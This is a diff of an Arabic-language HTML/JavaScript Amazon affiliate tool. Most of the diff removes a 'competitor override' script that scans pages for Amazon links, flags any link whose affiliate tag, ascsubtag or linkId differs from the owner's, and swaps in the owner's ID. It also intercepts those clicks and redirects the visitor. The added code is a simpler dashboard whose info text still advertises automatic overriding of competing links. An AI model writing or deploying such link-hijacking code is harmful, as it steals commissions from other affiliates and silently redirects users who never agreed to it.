-                statusText.innerHTML = `🛡️ ${trackingData.affiliateId}<br>⏰ ${hoursLeft}:${minutesLeft.toString().padStart(2, '0')}<br>✅ نشط`;
-                indicator.classList.remove('hidden');
+            if (navigator.share) {
+                navigator.share({
+                    title: 'رابط تتبع Amazon مع حماية الكوكيز',
+                    text: 'رابط تتبع محمي مع نظام تغليب قوي للكوكيز',
+                    url: linkText
+                });
             } else {
-                indicator.classList.add('hidden');
+                // نسخ للـ clipboard كبديل
+                copyToClipboard();
             }
+        }
+        
+        // تفعيل النظام
+        function activateSystem() {
+            systemActive = true;
+            saveSystemData();
+            updateStatus();
+            showAlert('تم تفعيل النظام بنجاح!', 'success');
+            
+            // بدء العداد
+            startTimer();
         }
         
         // بدء العداد
-        function startTimer(trackingData, timeLeft) {
+        function startTimer() {
             if (timerInterval) {
                 clearInterval(timerInterval);
             }
+            
+            let timeLeft = SYSTEM_CONFIG.cookieDuration;
             
             timerInterval = setInterval(() => {
                 timeLeft -= 1000;
                 
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    clearAllCookies();
+                    systemActive = false;
+                    saveSystemData();
+                    updateStatus();
+                    showAlert('انتهت صلاحية الكوكيز', 'error');
                     return;
                 }
                 
-                updateCookieStatusIndicator(trackingData, timeLeft);
+                updateStats();
             }, 1000);
         }
         
-        // تفعيل نظام التغليب
-        function activateOverrideSystem() {
-            if (isOverrideSystemActive) {
-                showStatus('نظام التغليب مفعل بالفعل!', 'info');
-                return;
+        // تحديث الإحصائيات
+        function updateStats() {
+            document.getElementById('totalLinks').textContent = trackingLinks.length;
+            document.getElementById('activeCookies').textContent = systemActive ? '1' : '0';
+            
+            if (systemActive) {
+                const timeLeft = SYSTEM_CONFIG.cookieDuration;
+                const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                document.getElementById('timeRemaining').textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}`;
+            } else {
+                document.getElementById('timeRemaining').textContent = '00:00';
             }
             
-            const cookieValue = getCookieProtected(AFFILIATE_COOKIE_NAME);
-            if (!cookieValue) {
-                showStatus('يجب قبول الكوكيز أولاً', 'error');
-                return;
+            document.getElementById('overrideRate').textContent = '100%';
+        }
+        
+        // تحديث الحالة
+        function updateStatus() {
+            const cookieStatus = document.getElementById('cookieStatus');
+            const overrideStatus = document.getElementById('overrideStatus');
+            const protectionStatus = document.getElementById('protectionStatus');
+            const lastUpdate = document.getElementById('lastUpdate');
+            
+            if (systemActive) {
+                cookieStatus.textContent = 'مفعلة';
+                cookieStatus.className = 'status-value status-active';
+                
+                overrideStatus.textContent = 'مفعل';
+                overrideStatus.className = 'status-value status-active';
+                
+                protectionStatus.textContent = 'محمية';
+                protectionStatus.className = 'status-value status-active';
+            } else {
+                cookieStatus.textContent = 'غير مفعلة';
+                cookieStatus.className = 'status-value status-inactive';
+                
+                overrideStatus.textContent = 'غير مفعل';
+                overrideStatus.className = 'status-value status-inactive';
+                
+                protectionStatus.textContent = 'غير محمية';
+                protectionStatus.className = 'status-value status-inactive';
             }
             
-            try {
-                const trackingData = JSON.parse(cookieValue);
-                
-                // تفعيل النظام
-                isOverrideSystemActive = true;
-                
-                // مراقبة جميع الروابط
-                monitorAllLinks(trackingData);
-                
-                // مراقبة النقر
-                monitorLinkClicks(trackingData);
-                
-                // مراقبة تغيير الصفحة
-                monitorPageChanges(trackingData);
-                
-                showStatus('تم تفعيل نظام التغليب بنجاح!', 'success');
-                
-                // تحديث المؤشر
-                updateCookieStatusIndicator();
-                
-            } catch (e) {
-                console.error('خطأ في تفعيل نظام التغليب:', e);
-                showStatus('خطأ في تفعيل النظام', 'error');
-            }
+            lastUpdate.textContent = new Date().toLocaleString('ar-EG');
         }
         
-        // مراقبة جميع الروابط
-        function monitorAllLinks(trackingData) {
-            console.log('🔍 بدء مراقبة جميع الروابط');
-            
-            // مراقبة التغييرات في DOM
-            const observer = new MutationObserver((mutations) => {
-                mutations.forEach((mutation) => {
-                    if (mutation.type === 'childList') {
-                        mutation.addedNodes.forEach((node) => {
-                            if (node.nodeType === Node.ELEMENT_NODE) {
-                                const newLinks = node.querySelectorAll ? node.querySelectorAll('a[href*="amazon"]') : [];
-                                newLinks.forEach(link => processLink(link, trackingData));
-                                
-                                if (node.tagName === 'A' && node.href && node.href.includes('amazon')) {
-                                    processLink(node, trackingData);
-                                }
-                            }
-                        });
-                    }
-                });
-            });
-            
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
-            });
-            
-            // معالجة الروابط الموجودة
-            const existingLinks = document.querySelectorAll('a[href*="amazon"]');
-            existingLinks.forEach(link => processLink(link, trackingData));
-            
-            console.log(`✅ تم معالجة ${existingLinks.length} رابط موجود`);
-        }
-        
-        // معالجة رابط
-        function processLink(link, trackingData) {
-            try {
-                const href = link.href;
+        // عرض معلومات النظام
+        function showSystemInfo() {
+            const info = `
+                🛡️ نظام إدارة الكوكيز الاحترافي للأفلييت
                 
-                // فحص إذا كان الرابط يحتوي على معرف أفلييت منافس
-                if (href.includes('tag=')) {
-                    const urlParams = new URLSearchParams(href);
-                    const currentTag = urlParams.get('tag');
-                    const currentAscsubtag = urlParams.get('ascsubtag');
-                    const currentLinkId = urlParams.get('linkId');
-                    
-                    // فحص إذا كان الرابط منافس
-                    let isCompetitor = false;
-                    let reason = '';
-                    
-                    // فحص المعرف
-                    if (currentTag !== trackingData.affiliateId) {
-                        isCompetitor = true;
-                        reason = 'معرف أفلييت مختلف';
-                    }
-                    // فحص ascsubtag
-                    else if (currentAscsubtag && currentAscsubtag !== trackingData.ascsubtag) {
-                        isCompetitor = true;
-                        reason = 'ascsubtag مختلف';
-                    }
-                    // فحص linkId
-                    else if (currentLinkId && currentLinkId !== trackingData.linkId) {
-                        isCompetitor = true;
-                        reason = 'linkId مختلف';
-                    }
-                    // فحص إذا كان الرابط جديد (ascsubtag مختلف حتى لو كان tag متطابق)
-                    else if (currentAscsubtag) {
-                        const visitedLinks = JSON.parse(localStorage.getItem('visited_affiliate_links') || '[]');
-                        const urlKey = href.split('?')[0];
-                        
-                        if (!visitedLinks.includes(urlKey + '_' + currentAscsubtag)) {
-                            isCompetitor = true;
-                            reason = 'رابط جديد - ascsubtag مختلف';
-                            
-                            // حفظ الرابط كرابط تم زيارته
-                            visitedLinks.push(urlKey + '_' + currentAscsubtag);
-                            localStorage.setItem('visited_affiliate_links', JSON.stringify(visitedLinks));
-                        }
-                    }
-                    
-                    if (isCompetitor) {
-                        console.log('🛡️ تم اكتشاف رابط منافس:', href);
-                        console.log('السبب:', reason);
-                        console.log('معرف الأفلييت الحالي:', currentTag);
-                        console.log('ascsubtag الحالي:', currentAscsubtag);
-                        console.log('linkId الحالي:', currentLinkId);
-                        
-                        // تعديل الرابط
-                        const modifiedUrl = modifyAffiliateLink(href, trackingData);
-                        
-                        // إضافة مؤشر بصري
-                        addVisualIndicator(link);
-                        
-                        // إضافة مستمع النقر
-                        addClickListener(link, modifiedUrl, trackingData);
-                        
-                        console.log('✅ تم تعديل الرابط:', modifiedUrl);
-                    }
-                }
-            } catch (e) {
-                console.error('خطأ في معالجة الرابط:', e);
-            }
-        }
-        
-        // تعديل رابط الأفلييت
-        function modifyAffiliateLink(originalUrl, trackingData) {
-            try {
-                const url = new URL(originalUrl);
+                📋 الميزات:
+                • إنشاء روابط تتبع ذكية
+                • حماية قوية للكوكيز لمدة 24 ساعة
+                • نظام تغليب تلقائي للروابط المنافسة
+                • واجهة إدارية احترافية
                 
-                // تعديل معرف الأفلييت
-                url.searchParams.set('tag', trackingData.affiliateId);
+                🔧 الإعدادات:
+                • معرف الأفلييت: ${SYSTEM_CONFIG.affiliateId}
+                • مدة الكوكيز: 24 ساعة
+                • مستوى الحماية: عالي
                 
-                // إضافة معاملات إضافية
-                url.searchParams.set('linkCode', trackingData.linkCode);
-                url.searchParams.set('camp', trackingData.camp);
-                url.searchParams.set('creative', trackingData.creative);
-                url.searchParams.set('ascsubtag', trackingData.ascsubtag);
-                
-                // إضافة معرف فريد
-                const trackingId = generateRandomId();
-                url.searchParams.set('linkId', trackingId);
-                
-                // إضافة timestamp
-                url.searchParams.set('ts', Date.now());
-                
-                // إضافة معامل التغليب
-                url.searchParams.set('override', 'true');
-                url.searchParams.set('protected', 'true');
-                
-                return url.toString();
-            } catch (e) {
-                return `${originalUrl}${originalUrl.includes('?') ? '&' : '?'}tag=${trackingData.affiliateId}&linkCode=${trackingData.linkCode}&camp=${trackingData.camp}&creative=${trackingData.creative}&ascsubtag=${trackingData.ascsubtag}&linkId=${generateRandomId()}&ts=${Date.now()}&override=true&protected=true`;
-            }
-        }
-        
-        // إضافة مؤشر بصري
-        function addVisualIndicator(link) {
-            link.classList.add('affiliate-link-indicator');
-            link.title = '🛡️ هذا الرابط محمي بكوكيزك';
-        }
-        
-        // إضافة مستمع النقر
-        function addClickListener(link, modifiedUrl, trackingData) {
-            link.removeEventListener('click', link.overrideHandler);
-            
-            link.overrideHandler = function(e) {
-                e.preventDefault();
-                console.log('🛡️ تم النقر على رابط منافس، يتم التغليب...');
-                
-                showOverrideMessage(modifiedUrl, trackingData);
-                
-                setTimeout(() => {
-                    window.location.href = modifiedUrl;
-                }, 2000);
-            };
-            
-            link.addEventListener('click', link.overrideHandler);
-        }
-        
-        // مراقبة النقر
-        function monitorLinkClicks(trackingData) {
-            document.addEventListener('click', function(e) {
-                const link = e.target.closest('a');
-                if (link && link.href && link.href.includes('amazon')) {
-                    if (link.href.includes('tag=')) {
-                        const urlParams = new URLSearchParams(link.href);
-                        const currentTag = urlParams.get('tag');
-                        const currentAscsubtag = urlParams.get('ascsubtag');
-                        const currentLinkId = urlParams.get('linkId');
-                        
-                        // فحص إذا كان الرابط منافس
-                        let isCompetitor = false;
-                        let reason = '';
-                        
-                        if (currentTag !== trackingData.affiliateId) {
-                            isCompetitor = true;
-                            reason = 'معرف أفلييت مختلف';
-                        }
-                        else if (currentAscsubtag && currentAscsubtag !== trackingData.ascsubtag) {
-                            isCompetitor = true;
-                            reason = 'ascsubtag مختلف';
-                        }
-                        else if (currentLinkId && currentLinkId !== trackingData.linkId) {
-                            isCompetitor = true;
-                            reason = 'linkId مختلف';
-                        }
-                        // فحص إذا كان الرابط جديد (ascsubtag مختلف حتى لو كان tag متطابق)
-                        else if (currentAscsubtag) {
-                            const visitedLinks = JSON.parse(localStorage.getItem('visited_affiliate_links') || '[]');
-                            const urlKey = link.href.split('?')[0];
-                            
-                            if (!visitedLinks.includes(urlKey + '_' + currentAscsubtag)) {
-                                isCompetitor = true;
-                                reason = 'رابط جديد - ascsubtag مختلف';
-                                
-                                // حفظ الرابط كرابط تم زيارته
-                                visitedLinks.push(urlKey + '_' + currentAscsubtag);
-                                localStorage.setItem('visited_affiliate_links', JSON.stringify(visitedLinks));
-                            }
-                        }
-                        
-                        if (isCompetitor) {
-                            console.log('🛡️ تم اكتشاف نقر على رابط منافس:', reason);
-                            e.preventDefault();
-                            
-                            const modifiedUrl = modifyAffiliateLink(link.href, trackingData);
-                            showOverrideMessage(modifiedUrl, trackingData, reason);
-                            
-                            setTimeout(() => {
-                                window.location.href = modifiedUrl;
-                            }, 2000);
-                        }
-                    }
-                }
-            });
-        }
-        
-        // مراقبة تغيير الصفحة
-        function monitorPageChanges(trackingData) {
-            let currentUrl = window.location.href;
-            
-            setInterval(() => {
-                if (window.location.href !== currentUrl) {
-                    console.log('🔄 تم تغيير الصفحة');
-                    currentUrl = window.location.href;
-                    
-                    setTimeout(() => {
-                        activateOverrideSystem();
-                    }, 1000);
-                }
-            }, 1000);
-        }
-        
-        // اختبار نظام التغليب
-        function testOverrideSystem() {
-            if (!isOverrideSystemActive) {
-                showStatus('يجب تفعيل نظام التغليب أولاً', 'error');
-                return;
-            }
-            
-            // إضافة روابط اختبار مع الروابط المحددة
-            const testContainer = document.createElement('div');
-            testContainer.innerHTML = `
-                <div style="
-                    position: fixed;
-                    top: 50%;
-                    left: 50%;
-                    transform: translate(-50%, -50%);
-                    background: linear-gradient(45deg, #17a2b8, #20c997);
-                    color: white;
-                    padding: 30px;
-                    border-radius: 20px;
-                    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-                    z-index: 10000;
-                    text-align: center;
-                    max-width: 600px;
-                ">
-                    <h3>🧪 اختبار نظام التغليب</h3>
-                    <p>اضغط على أي رابط لرؤية النظام يعمل:</p>
-                    
-                    <div style="margin: 20px 0;">
-                        <a href="https://www.amazon.eg/dp/B093ZW533Y/?smid=A1ZVRGNO5AYLOV&&_encoding=UTF8&tag=yajnyeg-21&linkCode=ur2&linkId=4ff5fa11b6d0385e8811d3e183795133&camp=247&creative=1211&ascsubtag=57861114" 
-                           style="
-                               display: inline-block;
-                               background: #ff6b6b;
-                               color: white;
-                               padding: 10px 20px;
-                               border-radius: 25px;
-                               text-decoration: none;
-                               margin: 10px;
-                           ">
-                            🔗 رابط منافس جديد (ascsubtag: 57861114)
-                        </a>
-                        
-                        <a href="https://www.amazon.eg/Dabur-Ayurvedic-Toothpaste-Ingredients-Complete/dp/B0BT822SWP?th=1&_=undefined&_encoding=UTF8&tag=yajnyeg-21&linkCode=ur2&linkId=4ff5fa11b6d0385e8811d3e183795133&camp=247&creative=1211&ascsubtag=57859024" 
-                           style="
-                               display: inline-block;
-                               background: #ff6b6b;
-                               color: white;
-                               padding: 10px 20px;
-                               border-radius: 25px;
-                               text-decoration: none;
-                               margin: 10px;
-                           ">
-                            🔗 رابط منافس (ascsubtag: 57859024)
-                        </a>
-                        
-                        <a href="https://www.amazon.eg/Dabur-Ayurvedic-Toothpaste-Ingredients-Complete/dp/B0BT822SWP?th=1&_=undefined&_encoding=UTF8&tag=yajnyeg-21&linkCode=ur2&linkId=4ff5fa11b6d0385e8811d3e183795133&camp=247&creative=1211&ascsubtag=57859192" 
-                           style="
-                               display: inline-block;
-                               background: #28a745;
-                               color: white;
-                               padding: 10px 20px;
-                               border-radius: 25px;
-                               text-decoration: none;
-                               margin: 10px;
-                           ">
-                            🔗 رابط أساسي (ascsubtag: 57859192)
-                        </a>
-                        
-                        <a href="https://www.amazon.eg/-/en/Dice-Men-Winter-Underset-Black-M/dp/B0BG64C776?tag=competitor1&linkCode=ur2&ascsubtag=12345" 
-                           style="
-                               display: inline-block;
-                               background: #ff6b6b;
-                               color: white;
-                               padding: 10px 20px;
-                               border-radius: 25px;
-                               text-decoration: none;
-                               margin: 10px;
-                           ">
-                            🔗 رابط منافس (معرف مختلف)
-                        </a>
-                    </div>
-                    
-                    <div style="background: rgba(255,255,255,0.2); border-radius: 10px; padding: 15px; margin: 15px 0; text-align: right;">
-                        <h4>📊 معلومات الاختبار:</h4>
-                        <p><strong>الرابط الأحمر الأول:</strong> رابط منافس جديد (ascsubtag: 57861114)</p>
-                        <p><strong>الرابط الأحمر الثاني:</strong> ascsubtag مختلف (57859024)</p>
-                        <p><strong>الرابط الأخضر:</strong> ascsubtag أساسي (57859192)</p>
-                        <p><strong>الرابط الأحمر الثالث:</strong> معرف مختلف</p>
-                        <p><small>النظام الآن يتعرف على الروابط الجديدة حتى لو كانت متطابقة مع المعرف الأساسي!</small></p>
-                    </div>
-                    
-                    <button class="action-btn danger" onclick="this.parentElement.remove()">❌ إغلاق</button>
-                </div>
+                📱 الاستخدام:
+                1. أدخل رابط المنتج
+                2. اضغط "إنشاء رابط التتبع"
+                3. شارك الرابط مع المستخدمين
+                4. النظام يعمل تلقائياً
             `;
             
-            document.body.appendChild(testContainer);
-            showStatus('تم إضافة روابط الاختبار! جرب النقر عليها', 'success');
+            alert(info);
         }
         
-        // مسح جميع الكوكيز
-        function clearAllCookies() {
-            const cookies = document.cookie.split(';');
-            
-            cookies.forEach(cookie => {
-                const [name] = cookie.trim().split('=');
-                document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
-            });
-            
-            if (timerInterval) {
-                clearInterval(timerInterval);
-            }
-            
-            isOverrideSystemActive = false;
-            
-            document.getElementById('cookieStatusIndicator').classList.add('hidden');
-            document.getElementById('productCookieBanner').classList.remove('show');
-            
-            showStatus('تم مسح جميع الكوكيز', 'info');
-        }
-        
-        // مسح الروابط المحفوظة
-        function clearVisitedLinks() {
-            localStorage.removeItem('visited_affiliate_links');
-            showStatus('تم مسح الروابط المحفوظة', 'info');
-        }
-        
-        // عرض حالة الكوكيز
-        function showCookieStatus() {
-            const cookieValue = getCookieProtected(AFFILIATE_COOKIE_NAME);
-            
-            if (cookieValue) {
-                try {
-                    const trackingData = JSON.parse(cookieValue);
-                    const timeLeft = trackingData.expiresAt - Date.now();
-                    
-                    if (timeLeft > 0) {
-                        const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
-                        const minutesLeft = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-                        
-                        showStatus(`كوكيز نشطة: ${trackingData.affiliateId} - الوقت المتبقي: ${hoursLeft}:${minutesLeft.toString().padStart(2, '0')}`, 'success');
-                    } else {
-                        showStatus('كوكيز منتهية الصلاحية', 'error');
-                    }
-                } catch (e) {
-                    showStatus('خطأ في قراءة بيانات الكوكيز', 'error');
+        // إعادة تعيين النظام
+        function resetSystem() {
+            if (confirm('هل أنت متأكد من إعادة تعيين النظام؟ سيتم مسح جميع البيانات.')) {
+                systemActive = false;
+                trackingLinks = [];
+                localStorage.clear();
+                
+                if (timerInterval) {
+                    clearInterval(timerInterval);
                 }
-            } else {
-                showStatus('لا توجد كوكيز نشطة', 'info');
+                
+                document.getElementById('generatedLinkSection').classList.add('hidden');
+                document.getElementById('productUrl').value = '';
+                
+                updateStats();
+                updateStatus();
+                showAlert('تم إعادة تعيين النظام', 'info');
             }
         }
         
-        // إظهار رسالة حالة
-        function showStatus(message, type = 'info') {
-            const statusDiv = document.createElement('div');
-            statusDiv.className = `status-message ${type}`;
-            statusDiv.textContent = message;
+        // عرض تنبيه
+        function showAlert(message, type = 'info') {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type}`;
+            alertDiv.textContent = message;
             
-            document.body.appendChild(statusDiv);
+            document.querySelector('.admin-content').insertBefore(alertDiv, document.querySelector('.input-section'));
             
             setTimeout(() => {
-                if (statusDiv.parentNode) {
-                    statusDiv.remove();
+                if (alertDiv.parentNode) {
+                    alertDiv.remove();
                 }
-            }, 3000);
+            }, 5000);
         }
         
-        // إنشاء معرف عشوائي
-        function generateRandomId() {
+        // إنشاء معرف فريد
+        function generateId() {
             return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
         }
         
-        // وظيفة فحص الروابط في الصفحة
-        function checkPageLinks() {
-            const allLinks = document.querySelectorAll('a[href*="amazon"]');
-            let competitorLinks = [];
-            
-            allLinks.forEach(link => {
-                const href = link.href;
-                if (href.includes('tag=')) {
-                    try {
-                        const urlParams = new URLSearchParams(href);
-                        const currentTag = urlParams.get('tag');
-                        const currentAscsubtag = urlParams.get('ascsubtag');
-                        const currentLinkId = urlParams.get('linkId');
-                        
-                        let isCompetitor = false;
-                        let reason = '';
-                        
-                        if (currentTag !== AFFILIATE_CONFIG.tag) {
-                            isCompetitor = true;
-                            reason = 'معرف أفلييت مختلف';
-                        }
-                        else if (currentAscsubtag && currentAscsubtag !== AFFILIATE_CONFIG.ascsubtag) {
-                            isCompetitor = true;
-                            reason = 'ascsubtag مختلف';
-                        }
-                        else if (currentLinkId && currentLinkId !== AFFILIATE_CONFIG.linkId) {
-                            isCompetitor = true;
-                            reason = 'linkId مختلف';
-                        }
-                        // فحص إذا كان الرابط جديد (ascsubtag مختلف حتى لو كان tag متطابق)
-                        else if (currentAscsubtag) {
-                            const visitedLinks = JSON.parse(localStorage.getItem('visited_affiliate_links') || '[]');
-                            const urlKey = href.split('?')[0];
-                            
-                            if (!visitedLinks.includes(urlKey + '_' + currentAscsubtag)) {
-                                isCompetitor = true;
-                                reason = 'رابط جديد - ascsubtag مختلف';
-                            }
-                        }
-                        
-                        if (isCompetitor) {
-                            competitorLinks.push({
-                                url: href,
-                                reason: reason,
-                                tag: currentTag,
-                                ascsubtag: currentAscsubtag,
-                                linkId: currentLinkId
-                            });
-                        }
-                    } catch (e) {
-                        console.error('خطأ في فحص الرابط:', e);
-                    }
-                }
-            });
-            
-            if (competitorLinks.length > 0) {
-                console.log('🛡️ تم اكتشاف روابط منافسة في الصفحة:', competitorLinks);
-                showCompetitorLinksSummary(competitorLinks);
-            } else {
-                console.log('✅ لا توجد روابط منافسة في الصفحة');
-            }
-            
-            return competitorLinks;
-        }
-        
-        // إظهار ملخص الروابط المنافسة
-        function showCompetitorLinksSummary(competitorLinks) {
-            const summary = document.createElement('div');
-            summary.className = 'override-message';
-            summary.style.maxWidth = '600px';
-            
-            let summaryContent = `
-                <h3>🛡️ ملخص الروابط المنافسة في الصفحة</h3>
-                <p>تم اكتشاف <strong>${competitorLinks.length}</strong> رابط منافس:</p>
-            `;
-            
-            competitorLinks.forEach((link, index) => {
-                summaryContent += `
-                    <div style="
-                        background: rgba(255,255,255,0.2);
-                        border-radius: 10px;
-                        padding: 15px;
-                        margin: 10px 0;
-                        text-align: right;
-                    ">
-                        <h4>🔗 رابط منافس ${index + 1}</h4>
-                        <p><strong>السبب:</strong> ${link.reason}</p>
-                        <p><strong>معرف الأفلييت:</strong> ${link.tag}</p>
-                        ${link.ascsubtag ? `<p><strong>ascsubtag:</strong> ${link.ascsubtag}</p>` : ''}
-                        ${link.linkId ? `<p><strong>linkId:</strong> ${link.linkId}</p>` : ''}
-                        <p><strong>الرابط:</strong></p>
-                        <div style="
-                            background: rgba(0,0,0,0.3);
-                            border-radius: 5px;
-                            padding: 10px;
-                            margin: 10px 0;
-                            font-family: monospace;
-                            font-size: 12px;
-                            word-break: break-all;
-                        ">
-                            ${link.url}
-                        </div>
-                    </div>
-                `;
-            });
-            
-            summaryContent += `
-                <p><strong>ملاحظة:</strong> هذه الروابط ستُعدل تلقائياً عند النقر عليها</p>
-                <button class="action-btn success" onclick="this.parentElement.remove()">✅ فهمت</button>
-            `;
-            
-            summary.innerHTML = summaryContent;
-            document.body.appendChild(summary);
-            
-            // إزالة الملخص تلقائياً بعد 15 ثانية
-            setTimeout(() => {
-                if (summary.parentNode) {
-                    summary.remove();
-                }
-            }, 15000);
-        }
-        
-        console.log('✅ تم تحميل نظام إدارة الكوكيز للأفلييت');
+        console.log('✅ تم تحميل النظام الاحترافي لإدارة الكوكيز');
     </script>
 </body>
 </html>
